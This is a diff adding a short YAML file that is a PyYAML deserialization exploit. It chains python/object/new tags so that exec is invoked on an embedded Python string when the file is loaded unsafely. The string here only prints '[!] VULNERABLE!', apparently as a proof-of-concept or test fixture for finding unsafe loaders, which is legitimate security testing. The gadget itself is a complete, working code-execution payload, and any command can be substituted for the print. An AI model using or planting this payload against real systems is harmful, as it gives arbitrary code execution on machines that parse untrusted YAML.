@@ -1,0 +1,8 @@
+- !!python/object/new:str
+    args: []
+    state: !!python/tuple
+    - "print('[!] VULNERABLE!')"
+    - !!python/object/new:staticmethod
+      args: [0]
+      state:
+        update: !!python/name:exec
